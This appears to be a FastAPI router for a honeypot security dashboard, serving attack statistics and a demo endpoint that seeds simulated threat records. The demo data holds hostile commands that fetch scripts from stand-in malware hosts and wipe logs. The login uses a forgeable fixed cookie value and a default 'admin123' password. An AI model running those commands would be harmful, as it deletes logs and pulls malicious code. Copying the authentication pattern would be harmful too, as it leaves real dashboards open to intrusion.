from fastapi import APIRouter, Depends, HTTPException, Request, Response
from sqlalchemy.orm import Session
from database.session import get_db
import os
from intelligence.analytics import (
    get_total_attacks,
    get_risk_distribution,
    get_top_ip,
    get_recent_activity,
    get_top_commands,
    get_attack_frequency_by_hour,
    get_geo_distribution
)

router = APIRouter()

def verify_auth(request: Request):
    # Simple hardcoded session check for dashboard security
    if request.cookies.get("shadow_session") == "AUTHORIZED_USER":
        return True
    raise HTTPException(status_code=401, detail="Unauthorized")

@router.post("/login")
async def login(data: dict, response: Response):
    password = data.get("password")
    env_pass = os.getenv("DASHBOARD_PASSWORD", "admin123")
    
    if password == env_pass:
        response.set_cookie(key="shadow_session", value="AUTHORIZED_USER", httponly=True)
        return {"status": "success"}
    
    raise HTTPException(status_code=401, detail="Invalid password")


@router.get("/stats", dependencies=[Depends(verify_auth)])
def soc_stats(db: Session = Depends(get_db)):
    return {
        "total_attacks": get_total_attacks(db),
        "top_ip": get_top_ip(db),
        "risk_distribution": get_risk_distribution(db),
    }

@router.get("/stats/malware", dependencies=[Depends(verify_auth)])
def soc_malware_stats(db: Session = Depends(get_db)):
    from intelligence.analytics import get_malware_stats
    return get_malware_stats(db)

@router.get("/threat-actors", dependencies=[Depends(verify_auth)])
def soc_threat_actors(db: Session = Depends(get_db)):
    from intelligence.analytics import get_top_threat_actors
    actors = get_top_threat_actors(db)
    return [
        {
            "ip": a.ip_address,
            "score": a.total_score,
            "classification": a.classification,
            "last_seen": str(a.last_seen)
        }
        for a in actors
    ]


@router.get("/activity", dependencies=[Depends(verify_auth)])
def soc_activity(db: Session = Depends(get_db)):
    activity = get_recent_activity(db, limit=100)

    return [
        {
            "ip": a.ip_address,
            "user": a.username,
            "command": a.command,
            "risk_score": a.risk_score,
            "attacker_type": a.attacker_type,
            "mitre_tactic": a.mitre_tactic,
            "time": str(a.timestamp),
        }
        for a in activity
    ]




@router.get("/analytics/top-commands", dependencies=[Depends(verify_auth)])
def soc_top_commands(db: Session = Depends(get_db)):
    return get_top_commands(db)

@router.get("/analytics/hourly", dependencies=[Depends(verify_auth)])
def analytics_hourly(db: Session = Depends(get_db)):
    return get_attack_frequency_by_hour(db)

@router.get("/analytics/geo", dependencies=[Depends(verify_auth)])
def soc_geo_analytics(db: Session = Depends(get_db)):
    return get_geo_distribution(db)
@router.post("/clear-stats", dependencies=[Depends(verify_auth)])
def clear_stats(db: Session = Depends(get_db)):
    from database.models import SSHSession, WebCredential
    db.query(SSHSession).delete()
    db.query(WebCredential).delete()
    db.commit()
    return {"status": "cleared"}

@router.post("/simulate-global", dependencies=[Depends(verify_auth)])
async def simulate_global(db: Session = Depends(get_db)):
    from database.models import SSHSession
    import uuid
    import datetime
    from dashboard.live_ws import manager
    from intelligence.geoip_engine import geoip_engine
    
    # Fake global threat data for demo
    threats = [
        {"ip": "95.161.225.100", "cmd": "curl http://miner.pool/start.sh", "risk": 90, "tactic": "Initial Access", "country": "Russia"},
        {"ip": "103.250.164.12", "cmd": "rm -rf /var/log/*", "risk": 85, "tactic": "Impact", "country": "China"},
        {"ip": "52.95.245.101", "cmd": "wget http://malware.xyz/payload.py", "risk": 70, "tactic": "Execution", "country": "USA"},
    ]
    
    for t in threats:
        session_id = str(uuid.uuid4())
        session = SSHSession(
            session_id=session_id,
            ip_address=t['ip'],
            username="root",
            password="password123",
            command=t['cmd'],
            risk_score=t['risk'],
            attacker_type="Advanced Persistent Threat",
            mitre_tactic=t['tactic'],
            timestamp=datetime.datetime.now()
        )
        db.add(session)
        
        # Broadcast live to dashboard
        await manager.broadcast({
            "session_id": session_id,
            "ip": t['ip'],
            "location": geoip_engine.get_location(t['ip']),
            "user": "root",
            "command": t['cmd'],
            "risk_score": t['risk'],
            "mitre_tactic": t['tactic'],
            "patterns": ["Simulation Mode Active"]
        })
    
    db.commit()
    return {"status": "Global threats deployed"}
